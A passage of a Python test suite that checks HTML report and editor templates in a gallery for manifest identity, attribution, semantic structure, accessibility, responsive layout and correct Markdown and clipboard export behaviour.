# ---------------------------------------------------------------------------

STATUS_REPORT_ID = "status-report"
STATUS_REPORT_SOURCE_FILE = "11-status-report.html"
STATUS_REPORT_LABEL = f"{TEMPLATES_DIR}/{STATUS_REPORT_ID}.html"
_STATUS_REPORT_SLOTS = ("summary", "landed", "in-flight", "blocked", "next-actions")
_STATUS_REPORT_LIST_SLOTS = _STATUS_REPORT_SLOTS[1:]


def check_s1(gallery_root: Path) -> list[str]:
    """S1 - the static report is complete, semantic, and reader-only."""
    matches = [
        entry for entry in (_entries(gallery_root) or [])
        if isinstance(entry, dict) and entry.get("id") == STATUS_REPORT_ID
    ]
    if len(matches) != 1:
        return [f"{MANIFEST_FILE}: expected one '{STATUS_REPORT_ID}' entry, found {len(matches)}"]
    entry = matches[0]
    source = entry.get("source")
    failures: list[str] = []
    if entry.get("status") != SHIPPED:
        failures.append(f"{MANIFEST_FILE}: '{STATUS_REPORT_ID}' must be shipped, found {entry.get('status')!r}")
    if entry.get("exports") != []:
        failures.append(f"{MANIFEST_FILE}: '{STATUS_REPORT_ID}' is a reader and must keep exports: []")
    if not isinstance(source, dict) or source.get("origin") != UPSTREAM or source.get("file") != STATUS_REPORT_SOURCE_FILE:
        failures.append(f"{MANIFEST_FILE}: '{STATUS_REPORT_ID}' must remain sourced from {STATUS_REPORT_SOURCE_FILE}")

    artifact = _artifact_path(gallery_root, STATUS_REPORT_ID)
    if artifact is None or not artifact.is_file():
        failures.append(f"{STATUS_REPORT_LABEL}: missing reader artifact")
        return failures

    text = _document_text(artifact)
    lowered = text.casefold()
    elements = _elements(text)
    attributes = [dict(element.attributes) for element in elements]
    authored = text
    for block in CANONICAL_FILES:
        if not _embeds(text, block):
            failures.append(f"{STATUS_REPORT_LABEL}: missing canonical {block} block")
        elif (expected := _canonical_region(gallery_root, block)) is None or _region(text, block) != expected:
            failures.append(f"{STATUS_REPORT_LABEL}: canonical {block} bytes drifted")
        else:
            authored = authored.replace(_region(text, block), "")

    header = _attribution_header(text)
    if header is None or any(not _carried(header, element) for element in ATTRIBUTION_ELEMENTS):
        failures.append(f"{STATUS_REPORT_LABEL}: incomplete upstream attribution header")
    elif _labelled_value(header, UPSTREAM_FILE_LABEL) != STATUS_REPORT_SOURCE_FILE:
        failures.append(f"{STATUS_REPORT_LABEL}: attribution must name {STATUS_REPORT_SOURCE_FILE}")

    for token in ("copy as", "navigator.clipboard", "execcommand(", "download="):
        if token in lowered:
            failures.append(f"{STATUS_REPORT_LABEL}: reader exposes export token {token!r}")
    if "<script" in authored.casefold():
        failures.append(f"{STATUS_REPORT_LABEL}: static reader adds behavior outside the canonical head")

    tags = [element.tag for element in elements]
    if tags.count("main") != 1 or tags.count("h1") != 1 or tags.count("h2") < 5:
        failures.append(f"{STATUS_REPORT_LABEL}: expected one main, one h1, and five semantic report headings")
    by_id = {attrs.get("id"): (element.tag, attrs) for element, attrs in zip(elements, attributes) if attrs.get("id")}
    for slot in _STATUS_REPORT_SLOTS:
        heading_id = f"{slot}-heading"
        if by_id.get(heading_id, (None,))[0] not in {"h2", "h3"}:
            failures.append(f"{STATUS_REPORT_LABEL}: '{slot}' needs a stable semantic heading")
    for slot in _STATUS_REPORT_LIST_SLOTS:
        pattern = rf"<ul\b.*?FILL:{re.escape(slot)}:START.*?<li\b.*?FILL:{re.escape(slot)}:END.*?</ul>"
        if not re.search(pattern, text, re.IGNORECASE | re.DOTALL):
            failures.append(f"{STATUS_REPORT_LABEL}: '{slot}' must be represented by a semantic list")

    if not re.search(r"\b(Status|Owner|Due|Next)\b", text, re.IGNORECASE):
        failures.append(f"{STATUS_REPORT_LABEL}: status meaning must be visible in text")
    if not re.search(r"<meta\s+[^>]*name=[\"']viewport[\"']", text, re.IGNORECASE):
        failures.append(f"{STATUS_REPORT_LABEL}: missing mobile viewport metadata")
    widths = [int(value) for value in re.findall(r"@media[^{}]*max-width\s*:\s*(\d+)px", text, re.IGNORECASE)]
    if not any(width >= 360 for width in widths):
        failures.append(f"{STATUS_REPORT_LABEL}: no responsive rule covers 360 CSS px")
    if "prefers-reduced-motion" not in text or ":focus-visible" not in text:
        failures.append(f"{STATUS_REPORT_LABEL}: visible-focus or reduced-motion handling is missing")
    for element, attrs in zip(elements, attributes):
        value = attrs.get("tabindex", "")
        if value.lstrip("-").isdigit() and int(value) > 0:
            failures.append(f"{STATUS_REPORT_LABEL}: <{element.tag}> uses positive tabindex={value!r}")
    for selector, declarations in _RULE_RE.findall(text):
        if _HORIZONTAL_OVERFLOW_RE.search(declarations):
            classes = re.findall(r"\.([A-Za-z_-][\w-]*)", selector)
            matched = [attrs for attrs in attributes if any(name in attrs.get("class", "").split() for name in classes)]
            if not matched or any(attrs.get("tabindex") != "0" or attrs.get("role") != "group" or not (attrs.get("aria-label", "").strip() or attrs.get("aria-labelledby", "").strip()) for attrs in matched):
                failures.append(f"{STATUS_REPORT_LABEL}: actual horizontal scroll element must be named, grouped, and keyboard reachable")
    return failures


class StatusReportReaderTests(unittest.TestCase):
    def test_status_report_contract_passes_against_the_shipped_gallery(self) -> None:
        self.assertEqual(check_s1(GALLERY_ROOT), [])


# ---------------------------------------------------------------------------
# Group T - ART-005 incident-report reader contract (FR-003, FR-005, FR-006,
# FR-013, FR-014, FR-020, FR-022)
# ---------------------------------------------------------------------------

INCIDENT_REPORT_ID = "incident-report"
INCIDENT_REPORT_SOURCE_FILE = "12-incident-report.html"
INCIDENT_REPORT_LABEL = f"{TEMPLATES_DIR}/{INCIDENT_REPORT_ID}.html"
_INCIDENT_REPORT_SLOTS = ("summary", "timeline", "impact", "root-cause", "follow-ups")
_INCIDENT_REPORT_LIST_SLOTS = ("timeline", "follow-ups")


def check_t1(gallery_root: Path) -> list[str]:
    """T1 - the incident narrative, navigation, and reader-only contract agree."""
    matches = [
        entry for entry in (_entries(gallery_root) or [])
        if isinstance(entry, dict) and entry.get("id") == INCIDENT_REPORT_ID
    ]
    if len(matches) != 1:
        return [f"{MANIFEST_FILE}: expected one '{INCIDENT_REPORT_ID}' entry, found {len(matches)}"]
    entry = matches[0]
    source = entry.get("source")
    failures: list[str] = []
    if entry.get("status") != SHIPPED:
        failures.append(f"{MANIFEST_FILE}: '{INCIDENT_REPORT_ID}' must be shipped, found {entry.get('status')!r}")
    if entry.get("exports") != []:
        failures.append(f"{MANIFEST_FILE}: '{INCIDENT_REPORT_ID}' is a reader and must keep exports: []")
    if not isinstance(source, dict) or source.get("origin") != UPSTREAM or source.get("file") != INCIDENT_REPORT_SOURCE_FILE:
        failures.append(f"{MANIFEST_FILE}: '{INCIDENT_REPORT_ID}' must remain sourced from {INCIDENT_REPORT_SOURCE_FILE}")

    artifact = _artifact_path(gallery_root, INCIDENT_REPORT_ID)
    if artifact is None or not artifact.is_file():
        failures.append(f"{INCIDENT_REPORT_LABEL}: missing reader artifact")
        return failures

    text = _document_text(artifact)
    lowered = text.casefold()
    elements = _elements(text)
    attributes = [dict(element.attributes) for element in elements]
    authored = text
    for block in CANONICAL_FILES:
        if not _embeds(text, block):
            failures.append(f"{INCIDENT_REPORT_LABEL}: missing canonical {block} block")
        elif (expected := _canonical_region(gallery_root, block)) is None or _region(text, block) != expected:
            failures.append(f"{INCIDENT_REPORT_LABEL}: canonical {block} bytes drifted")
        else:
            authored = authored.replace(_region(text, block), "")

    header = _attribution_header(text)
    if header is None or any(not _carried(header, element) for element in ATTRIBUTION_ELEMENTS):
        failures.append(f"{INCIDENT_REPORT_LABEL}: incomplete upstream attribution header")
    elif _labelled_value(header, UPSTREAM_FILE_LABEL) != INCIDENT_REPORT_SOURCE_FILE:
        failures.append(f"{INCIDENT_REPORT_LABEL}: attribution must name {INCIDENT_REPORT_SOURCE_FILE}")

    for token in ("copy as", "navigator.clipboard", "execcommand(", "download="):
        if token in lowered:
            failures.append(f"{INCIDENT_REPORT_LABEL}: reader exposes export token {token!r}")
    if "<script" in authored.casefold():
        failures.append(f"{INCIDENT_REPORT_LABEL}: static reader adds behavior outside the canonical head")

    tags = [element.tag for element in elements]
    if tags.count("main") != 1 or tags.count("h1") != 1 or tags.count("h2") < 5:
        failures.append(f"{INCIDENT_REPORT_LABEL}: expected one main, one h1, and five semantic report headings")
    by_id = {attrs.get("id"): element.tag for element, attrs in zip(elements, attributes) if attrs.get("id")}
    for slot in _INCIDENT_REPORT_SLOTS:
        if by_id.get(f"{slot}-heading") not in {"h2", "h3"}:
            failures.append(f"{INCIDENT_REPORT_LABEL}: '{slot}' needs a stable semantic heading")

    nav = re.search(r"<nav\b.*?</nav>", text, re.IGNORECASE | re.DOTALL)
    if nav is None or any(f'href="#{slot}"' not in nav.group(0) for slot in _INCIDENT_REPORT_SLOTS):
        failures.append(f"{INCIDENT_REPORT_LABEL}: report navigation must link every stable report section")
    for slot in _INCIDENT_REPORT_LIST_SLOTS:
        pattern = rf"<(?:ol|ul)\b.*?FILL:{re.escape(slot)}:START.*?<li\b.*?FILL:{re.escape(slot)}:END.*?</(?:ol|ul)>"
        if not re.search(pattern, text, re.IGNORECASE | re.DOTALL):
            failures.append(f"{INCIDENT_REPORT_LABEL}: '{slot}' must be represented by a semantic list")

    for literal in ("SEV-2", "Resolved", "Duration", "Owner", "Root cause", "Impact", "Follow-ups"):
        if literal.casefold() not in lowered:
            failures.append(f"{INCIDENT_REPORT_LABEL}: missing text-backed incident meaning {literal!r}")
    if not re.search(r"<meta\s+[^>]*name=[\"']viewport[\"']", text, re.IGNORECASE):
        failures.append(f"{INCIDENT_REPORT_LABEL}: missing mobile viewport metadata")
    widths = [int(value) for value in re.findall(r"@media[^{}]*max-width\s*:\s*(\d+)px", text, re.IGNORECASE)]
    if not any(width >= 360 for width in widths):
        failures.append(f"{INCIDENT_REPORT_LABEL}: no responsive rule covers 360 CSS px")
    if "prefers-reduced-motion" not in text or ":focus-visible" not in text:
        failures.append(f"{INCIDENT_REPORT_LABEL}: visible-focus or reduced-motion handling is missing")
    for element, attrs in zip(elements, attributes):
        value = attrs.get("tabindex", "")
        if value.lstrip("-").isdigit() and int(value) > 0:
            failures.append(f"{INCIDENT_REPORT_LABEL}: <{element.tag}> uses positive tabindex={value!r}")
    for selector, declarations in _RULE_RE.findall(text):
        if _HORIZONTAL_OVERFLOW_RE.search(declarations):
            classes = re.findall(r"\.([A-Za-z_-][\w-]*)", selector)
            matched = [attrs for attrs in attributes if any(name in attrs.get("class", "").split() for name in classes)]
            if not matched or any(attrs.get("tabindex") != "0" or attrs.get("role") != "group" or not (attrs.get("aria-label", "").strip() or attrs.get("aria-labelledby", "").strip()) for attrs in matched):
                failures.append(f"{INCIDENT_REPORT_LABEL}: actual horizontal scroll element must be named, grouped, and keyboard reachable")
    return failures


class IncidentReportReaderTests(unittest.TestCase):
    def test_incident_report_contract_passes_against_the_shipped_gallery(self) -> None:
        self.assertEqual(check_t1(GALLERY_ROOT), [])


# ---------------------------------------------------------------------------
# Group U - ART-005 triage-board producer contract (FR-003, FR-007,
# FR-009-FR-014, FR-019-FR-023)
# ---------------------------------------------------------------------------

TRIAGE_BOARD_ID = "triage-board"
TRIAGE_BOARD_SOURCE_FILE = "18-editor-triage-board.html"
TRIAGE_BOARD_LABEL = f"{TEMPLATES_DIR}/{TRIAGE_BOARD_ID}.html"
_TRIAGE_COLUMNS = ("now", "next", "later", "cut")
_TRIAGE_FIELDS = ("id", "title", "tag", "estimate", "owner")
_ISSUE_FIELDS = (
    "code", "artifactId", "entityType", "entityId", "field",
    "occurrenceIndex", "relatedOccurrenceIndex", "rawValue",
    "normalizedValue", "message",
)


def _javascript_array(text: str, name: str) -> tuple[str, ...] | None:
    match = re.search(rf"const\s+{name}\s*=\s*(\[[^;]+\]);", text, re.DOTALL)
    if match is None:
        return None
    try:
        value = json.loads(match.group(1))
    except json.JSONDecodeError:
        return None
    return tuple(value) if isinstance(value, list) and all(isinstance(item, str) for item in value) else None


def check_u1(gallery_root: Path) -> list[str]:
    """U1 - manifest identity, memory-only editing, and accessibility agree."""
    matches = [
        entry for entry in (_entries(gallery_root) or [])
        if isinstance(entry, dict) and entry.get("id") == TRIAGE_BOARD_ID
    ]
    if len(matches) != 1:
        return [f"{MANIFEST_FILE}: expected one '{TRIAGE_BOARD_ID}' entry, found {len(matches)}"]
    entry = matches[0]
    source = entry.get("source")
    failures: list[str] = []
    if entry.get("status") != SHIPPED:
        failures.append(f"{MANIFEST_FILE}: '{TRIAGE_BOARD_ID}' must be shipped, found {entry.get('status')!r}")
    if entry.get("exports") != ["markdown"]:
        failures.append(f"{MANIFEST_FILE}: '{TRIAGE_BOARD_ID}' must export only markdown")
    if not isinstance(source, dict) or source.get("origin") != UPSTREAM or source.get("file") != TRIAGE_BOARD_SOURCE_FILE:
        failures.append(f"{MANIFEST_FILE}: '{TRIAGE_BOARD_ID}' must remain sourced from {TRIAGE_BOARD_SOURCE_FILE}")

    artifact = _artifact_path(gallery_root, TRIAGE_BOARD_ID)
    if artifact is None or not artifact.is_file():
        failures.append(f"{TRIAGE_BOARD_LABEL}: missing producer artifact")
        return failures
    text = _document_text(artifact)
    authored = text
    for block in CANONICAL_FILES:
        if not _embeds(text, block):
            failures.append(f"{TRIAGE_BOARD_LABEL}: missing canonical {block} block")
        elif (expected := _canonical_region(gallery_root, block)) is None or _region(text, block) != expected:
            failures.append(f"{TRIAGE_BOARD_LABEL}: canonical {block} bytes drifted")
        else:
            authored = authored.replace(_region(text, block), "")
    header = _attribution_header(text)
    if header is None or any(not _carried(header, element) for element in ATTRIBUTION_ELEMENTS):
        failures.append(f"{TRIAGE_BOARD_LABEL}: incomplete upstream attribution header")
    elif _labelled_value(header, UPSTREAM_FILE_LABEL) != TRIAGE_BOARD_SOURCE_FILE:
        failures.append(f"{TRIAGE_BOARD_LABEL}: attribution must name {TRIAGE_BOARD_SOURCE_FILE}")

    elements = _elements(text)
    attributes = [dict(element.attributes) for element in elements]
    by_id = {attrs.get("id"): (element.tag, attrs) for element, attrs in zip(elements, attributes) if attrs.get("id")}
    required_ids = ("board", "tag-filter", "clear-filter", "reset-board", "copy-markdown", "copy-status", "copy-fallback")
    failures.extend(f"{TRIAGE_BOARD_LABEL}: missing named control or region #{item}" for item in required_ids if item not in by_id)
    board = by_id.get("board", (None, {}))[1]
    if board.get("role") != "group" or not (board.get("aria-label") or board.get("aria-labelledby")):
        failures.append(f"{TRIAGE_BOARD_LABEL}: board must be a named group")
    for column in _TRIAGE_COLUMNS:
        attrs = by_id.get(f"column-{column}", (None, {}))[1]
        if attrs.get("data-column") != column or not attrs.get("aria-labelledby"):
            failures.append(f"{TRIAGE_BOARD_LABEL}: column {column!r} must expose its key and name")
    tickets = [attrs for attrs in attributes if attrs.get("data-ticket-id") is not None]
    if len(tickets) < 4 or any(attrs.get("tabindex") != "0" or not attrs.get("aria-label") for attrs in tickets):
        failures.append(f"{TRIAGE_BOARD_LABEL}: expected at least four named keyboard-focusable tickets")
    for token in (
        "keydown", "ArrowLeft", "ArrowRight", "ArrowUp", "ArrowDown",
        "moveTicket", "reorderTicket", ".focus()",
        'const tickets = visibleTickets(ticket.closest(".column"));',
    ):
        if token not in text:
            failures.append(f"{TRIAGE_BOARD_LABEL}: missing keyboard movement hook {token!r}")
    for literal in ("No tickets in this column.", "No tickets match this filter.", 'role="status"', 'aria-live="polite"'):
        if literal not in text:
            failures.append(f"{TRIAGE_BOARD_LABEL}: missing visible state/status contract {literal!r}")
    if text.count(">Copy as Markdown<") != 1:
        failures.append(f"{TRIAGE_BOARD_LABEL}: expected exactly one control labeled Copy as Markdown")
    for token in ("sessionstorage", "indexeddb", "urlsearchparams", "execcommand(", "download="):
        if token in authored.casefold():
            failures.append(f"{TRIAGE_BOARD_LABEL}: producer uses prohibited state/export token {token!r}")
    widths = [int(value) for value in re.findall(r"@media[^{}]*max-width\s*:\s*(\d+)px", text, re.IGNORECASE)]
    if not any(width >= 360 for width in widths) or "prefers-reduced-motion" not in text or ":focus-visible" not in text:
        failures.append(f"{TRIAGE_BOARD_LABEL}: responsive, reduced-motion, or visible-focus handling is missing")
    return failures


def check_u2(gallery_root: Path) -> list[str]:
    """U2 - one live snapshot serializes deterministic board and issue order."""
    artifact = _artifact_path(gallery_root, TRIAGE_BOARD_ID)
    if artifact is None or not artifact.is_file():
        return [f"{TRIAGE_BOARD_LABEL}: missing producer artifact"]
    text = _document_text(artifact)
    failures: list[str] = []
    for name, expected in (("COLUMN_ORDER", _TRIAGE_COLUMNS), ("TICKET_FIELDS", _TRIAGE_FIELDS), ("ISSUE_FIELDS", _ISSUE_FIELDS)):
        if _javascript_array(text, name) != expected:
            failures.append(f"{TRIAGE_BOARD_LABEL}: {name} must declare exact deterministic order {expected!r}")
    required = (
        "captureSnapshot", "serializeBoard", "escapeMarkdown", "markdownCodeSpan", "issueScalar",
        "editableText", "Node.TEXT_NODE", 'current.nodeName === "BR"',
        "return node ? editableText(node) : \"\";",
        "# Triage Board Export", "Artifact: triage-board", "Export kind: markdown",
        "## Now", "## Next", "## Later", "## Cut", "- _No tickets._",
        "## Issues", "- _No issues._", "duplicate_identifier",
        "Identifier duplicates the first visible occurrence.",
        "const snapshot = captureSnapshot();", "const markdown = serializeBoard(snapshot);",
        'lines.push("- " + markdownCodeSpan(ticket.id));',
    )
    failures.extend(f"{TRIAGE_BOARD_LABEL}: missing serializer contract {token!r}" for token in required if token not in text)
    if "cachedMarkdown" in text or text.count("const markdown = serializeBoard(snapshot);") != 1:
        failures.append(f"{TRIAGE_BOARD_LABEL}: export must serialize one fresh snapshot exactly once per invocation")
    if 'split("\\n")' not in text or 'JSON.stringify(value)' not in text:
        failures.append(f"{TRIAGE_BOARD_LABEL}: multiline Markdown or JSON-scalar issue escaping is not explicit")
    return failures


def check_u3(gallery_root: Path) -> list[str]:
    """U3 - clipboard recovery is current-invocation and zero/one-attempt."""
    artifact = _artifact_path(gallery_root, TRIAGE_BOARD_ID)
    if artifact is None or not artifact.is_file():
        return [f"{TRIAGE_BOARD_LABEL}: missing producer artifact"]
    text = _document_text(artifact)
    failures: list[str] = []
    required = (
        "let copyAttempt = 0;", "const attempt = ++copyAttempt;", "clearCopyState();",
        "const clipboard = navigator.clipboard;", 'typeof clipboard.writeText !== "function"',
        "await clipboard.writeText(markdown);", "showFallback(markdown);",
        "Copied. Markdown is on the clipboard.",
        "Copy failed. The Markdown export is available below for manual copy.",
        "fallback.hidden = false;", "fallback.value = markdown;", "fallback.focus();", "fallback.select();",
    )
    failures.extend(f"{TRIAGE_BOARD_LABEL}: missing clipboard state hook {token!r}" for token in required if token not in text)
    if text.count("clipboard.writeText(markdown)") != 1:
        failures.append(f"{TRIAGE_BOARD_LABEL}: current invocation must call writeText at most once")
    if text.count("attempt !== copyAttempt") < 2:
        failures.append(f"{TRIAGE_BOARD_LABEL}: both superseded settlement directions need currency guards")
    if text.casefold().count("execcommand(") or "download=" in text.casefold():
        failures.append(f"{TRIAGE_BOARD_LABEL}: hidden copying and download recovery are prohibited")
    return failures


class TriageBoardProducerTests(unittest.TestCase):
    def test_triage_board_editing_contract_passes_against_the_shipped_gallery(self) -> None:
        self.assertEqual(check_u1(GALLERY_ROOT), [])

    def test_triage_board_serializer_contract_passes_against_the_shipped_gallery(self) -> None:
        self.assertEqual(check_u2(GALLERY_ROOT), [])

    def test_triage_board_clipboard_contract_passes_against_the_shipped_gallery(self) -> None:
        self.assertEqual(check_u3(GALLERY_ROOT), [])


# ---------------------------------------------------------------------------
# Group V - ART-005 feature-flags producer contract (FR-003, FR-007-FR-014,
# FR-019-FR-023)
# ---------------------------------------------------------------------------

FEATURE_FLAGS_ID = "feature-flags"
FEATURE_FLAGS_SOURCE_FILE = "19-editor-feature-flags.html"
FEATURE_FLAGS_LABEL = f"{TEMPLATES_DIR}/{FEATURE_FLAGS_ID}.html"
_FLAG_ROOT_FIELDS = ("schemaVersion", "artifactId", "groups", "issues")
_FLAG_GROUP_FIELDS = ("id", "label", "flags")
_FLAG_FIELDS = ("key", "description", "enabled", "requires", "rollout")


def check_v1(gallery_root: Path) -> list[str]:
    """V1 - manifest identity, named memory-only controls, and feedback agree."""
    matches = [entry for entry in (_entries(gallery_root) or []) if isinstance(entry, dict) and entry.get("id") == FEATURE_FLAGS_ID]
    if len(matches) != 1:
        return [f"{MANIFEST_FILE}: expected one '{FEATURE_FLAGS_ID}' entry, found {len(matches)}"]
    entry = matches[0]
    source = entry.get("source")
    failures: list[str] = []
    if entry.get("status") != SHIPPED:
        failures.append(f"{MANIFEST_FILE}: '{FEATURE_FLAGS_ID}' must be shipped, found {entry.get('status')!r}")
    if entry.get("exports") != ["markdown"]:
        failures.append(f"{MANIFEST_FILE}: '{FEATURE_FLAGS_ID}' must export only markdown")
    if not isinstance(source, dict) or source.get("origin") != UPSTREAM or source.get("file") != FEATURE_FLAGS_SOURCE_FILE:
        failures.append(f"{MANIFEST_FILE}: '{FEATURE_FLAGS_ID}' must remain sourced from {FEATURE_FLAGS_SOURCE_FILE}")

    artifact = _artifact_path(gallery_root, FEATURE_FLAGS_ID)
    if artifact is None or not artifact.is_file():
        failures.append(f"{FEATURE_FLAGS_LABEL}: missing producer artifact")
        return failures
    text = _document_text(artifact)
    authored = text
    for block in CANONICAL_FILES:
        if not _embeds(text, block):
            failures.append(f"{FEATURE_FLAGS_LABEL}: missing canonical {block} block")
        elif (expected := _canonical_region(gallery_root, block)) is None or _region(text, block) != expected:
            failures.append(f"{FEATURE_FLAGS_LABEL}: canonical {block} bytes drifted")
        else:
            authored = authored.replace(_region(text, block), "")
    header = _attribution_header(text)
    if header is None or any(not _carried(header, element) for element in ATTRIBUTION_ELEMENTS):
        failures.append(f"{FEATURE_FLAGS_LABEL}: incomplete upstream attribution header")
    elif _labelled_value(header, UPSTREAM_FILE_LABEL) != FEATURE_FLAGS_SOURCE_FILE:
        failures.append(f"{FEATURE_FLAGS_LABEL}: attribution must name {FEATURE_FLAGS_SOURCE_FILE}")

    elements = _elements(text)
    attributes = [dict(element.attributes) for element in elements]
    by_id = {attrs.get("id"): (element.tag, attrs) for element, attrs in zip(elements, attributes) if attrs.get("id")}
    required_ids = ("flag-groups", "dependency-summary", "reset-flags", "copy-markdown", "copy-status", "copy-fallback")
    failures.extend(f"{FEATURE_FLAGS_LABEL}: missing named control or region #{item}" for item in required_ids if item not in by_id)
    groups = [attrs for attrs in attributes if attrs.get("data-group-id") is not None]
    flags = [attrs for attrs in attributes if attrs.get("data-flag-key") is not None]
    checkboxes = [attrs for element, attrs in zip(elements, attributes) if element.tag == "input" and attrs.get("type") == "checkbox"]
    if len(groups) < 3 or any(not attrs.get("aria-labelledby") for attrs in groups):
        failures.append(f"{FEATURE_FLAGS_LABEL}: expected at least three named flag groups")
    if len(flags) < 6 or len(checkboxes) < 6 or any(not attrs.get("aria-label") for attrs in checkboxes):
        failures.append(f"{FEATURE_FLAGS_LABEL}: expected at least six named checkbox flags")
    for literal in (
        "No flags in this group.", "Dependency unavailable.", "Invalid rollout; export uses null.",
        'id="dependency-summary" role="status" aria-live="polite"',
        "visible required, dependency, or validation issue", "aria-errormessage",
        'control.setAttribute("aria-invalid", empty ? "true" : "false");',
        'role="status"', 'aria-live="polite"',
    ):
        if literal not in text:
            failures.append(f"{FEATURE_FLAGS_LABEL}: missing visible state/status contract {literal!r}")
    if text.count(">Copy as Markdown<") != 1:
        failures.append(f"{FEATURE_FLAGS_LABEL}: expected exactly one control labeled Copy as Markdown")
    for token in ("sessionstorage", "indexeddb", "urlsearchparams", "execcommand(", "download="):
        if token in authored.casefold():
            failures.append(f"{FEATURE_FLAGS_LABEL}: producer uses prohibited state/export token {token!r}")
    widths = [int(value) for value in re.findall(r"@media[^{}]*max-width\s*:\s*(\d+)px", text, re.IGNORECASE)]
    if not any(width >= 360 for width in widths) or "prefers-reduced-motion" not in text or ":focus-visible" not in text:
        failures.append(f"{FEATURE_FLAGS_LABEL}: responsive, reduced-motion, or visible-focus handling is missing")
    return failures


def check_v2(gallery_root: Path) -> list[str]:
    """V2 - one fresh snapshot emits typed, ordered, round-trippable JSON."""
    artifact = _artifact_path(gallery_root, FEATURE_FLAGS_ID)
    if artifact is None or not artifact.is_file():
        return [f"{FEATURE_FLAGS_LABEL}: missing producer artifact"]
    text = _document_text(artifact)
    failures: list[str] = []
    for name, expected in (("ROOT_FIELDS", _FLAG_ROOT_FIELDS), ("GROUP_FIELDS", _FLAG_GROUP_FIELDS), ("FLAG_FIELDS", _FLAG_FIELDS), ("ISSUE_FIELDS", _ISSUE_FIELDS)):
        if _javascript_array(text, name) != expected:
            failures.append(f"{FEATURE_FLAGS_LABEL}: {name} must declare exact deterministic order {expected!r}")
    required = (
        "captureSnapshot", "serializeFlags", "parseRollout", "parseRequires", "collectIssues",
        "# Feature Flags Export", "Artifact: feature-flags", "Export kind: markdown",
        "artifact-gallery.feature-flags.export.v1", 'JSON.stringify(snapshot, null, 2)',
        'schemaVersion: "artifact-gallery.feature-flags.export.v1"', 'artifactId: "feature-flags"',
        "duplicate_identifier", "invalid_value", "unavailable_value", "rawValue", "normalizedValue",
        "Required value is empty.", "Value is invalid and was not normalized.",
        "A normalized value is unavailable.", "Identifier duplicates the first visible occurrence.",
        "DECIMAL_ROLLOUT.test(rawValue)", "Number.parseFloat(rawValue)",
        "const snapshot = captureSnapshot();", "const markdown = serializeFlags(snapshot);",
    )
    failures.extend(f"{FEATURE_FLAGS_LABEL}: missing serializer contract {token!r}" for token in required if token not in text)
    if "cachedMarkdown" in text or text.count("const markdown = serializeFlags(snapshot);") != 1:
        failures.append(f"{FEATURE_FLAGS_LABEL}: export must serialize one fresh snapshot exactly once per invocation")
    if 'String.fromCharCode(96).repeat(3)' not in text or 'FENCE + "json"' not in text:
        failures.append(f"{FEATURE_FLAGS_LABEL}: export must contain exactly one explicit JSON fence")
    if "Number(rawValue)" in text:
        failures.append(f"{FEATURE_FLAGS_LABEL}: rollout parsing must not use coercive Number(rawValue)")
    return failures


def check_v3(gallery_root: Path) -> list[str]:
    """V3 - clipboard recovery is current-invocation and zero/one-attempt."""
    artifact = _artifact_path(gallery_root, FEATURE_FLAGS_ID)
    if artifact is None or not artifact.is_file():
        return [f"{FEATURE_FLAGS_LABEL}: missing producer artifact"]
    text = _document_text(artifact)
    failures: list[str] = []
    required = (
        "let copyAttempt = 0;", "const attempt = ++copyAttempt;", "clearCopyState();",
        "const clipboard = navigator.clipboard;", 'typeof clipboard.writeText !== "function"',
        "await clipboard.writeText(markdown);", "showFallback(markdown);",
        "Copied. Markdown is on the clipboard.",
        "Copy failed. The Markdown export is available below for manual copy.",
        "fallback.hidden = false;", "fallback.value = markdown;", "fallback.focus();", "fallback.select();",
    )
    failures.extend(f"{FEATURE_FLAGS_LABEL}: missing clipboard state hook {token!r}" for token in required if token not in text)
    if text.count("clipboard.writeText(markdown)") != 1:
        failures.append(f"{FEATURE_FLAGS_LABEL}: current invocation must call writeText at most once")
    if text.count("attempt !== copyAttempt") < 2:
        failures.append(f"{FEATURE_FLAGS_LABEL}: both superseded settlement directions need currency guards")
    if text.casefold().count("execcommand(") or "download=" in text.casefold():
        failures.append(f"{FEATURE_FLAGS_LABEL}: hidden copying and download recovery are prohibited")
    return failures


class FeatureFlagsProducerTests(unittest.TestCase):
    def test_feature_flags_editing_contract_passes_against_the_shipped_gallery(self) -> None:
        self.assertEqual(check_v1(GALLERY_ROOT), [])

    def test_feature_flags_serializer_contract_passes_against_the_shipped_gallery(self) -> None:
        self.assertEqual(check_v2(GALLERY_ROOT), [])

    def test_feature_flags_clipboard_contract_passes_against_the_shipped_gallery(self) -> None:
        self.assertEqual(check_v3(GALLERY_ROOT), [])


# ---------------------------------------------------------------------------
# Group W - ART-005 prompt-tuner producer contract (FR-003, FR-007-FR-014,
# FR-019-FR-023)
# ---------------------------------------------------------------------------

PROMPT_TUNER_ID = "prompt-tuner"
PROMPT_TUNER_SOURCE_FILE = "20-editor-prompt-tuner.html"
PROMPT_TUNER_LABEL = f"{TEMPLATES_DIR}/{PROMPT_TUNER_ID}.html"
_PROMPT_ROOT_FIELDS = ("schemaVersion", "artifactId", "template", "slots", "samples", "issues")
_PROMPT_SAMPLE_FIELDS = ("id", "label", "planClass", "fields", "preview")


def check_w1(gallery_root: Path) -> list[str]:
    """W1 - manifest, accessible live editor, feedback, and memory-only state agree."""
    matches = [entry for entry in (_entries(gallery_root) or []) if isinstance(entry, dict) and entry.get("id") == PROMPT_TUNER_ID]
    if len(matches) != 1:
        return [f"{MANIFEST_FILE}: expected one '{PROMPT_TUNER_ID}' entry, found {len(matches)}"]
    entry = matches[0]
    source = entry.get("source")
    failures: list[str] = []
    if entry.get("status") != SHIPPED:
        failures.append(f"{MANIFEST_FILE}: '{PROMPT_TUNER_ID}' must be shipped, found {entry.get('status')!r}")
    if entry.get("exports") != ["markdown"]:
        failures.append(f"{MANIFEST_FILE}: '{PROMPT_TUNER_ID}' must export only markdown")
    if not isinstance(source, dict) or source.get("origin") != UPSTREAM or source.get("file") != PROMPT_TUNER_SOURCE_FILE:
        failures.append(f"{MANIFEST_FILE}: '{PROMPT_TUNER_ID}' must remain sourced from {PROMPT_TUNER_SOURCE_FILE}")

    artifact = _artifact_path(gallery_root, PROMPT_TUNER_ID)
    if artifact is None or not artifact.is_file():
        failures.append(f"{PROMPT_TUNER_LABEL}: missing producer artifact")
        return failures
    text = _document_text(artifact)
    authored = text
    for block in CANONICAL_FILES:
        if not _embeds(text, block):
            failures.append(f"{PROMPT_TUNER_LABEL}: missing canonical {block} block")
        elif (expected := _canonical_region(gallery_root, block)) is None or _region(text, block) != expected:
            failures.append(f"{PROMPT_TUNER_LABEL}: canonical {block} bytes drifted")
        else:
            authored = authored.replace(_region(text, block), "")
    header = _attribution_header(text)
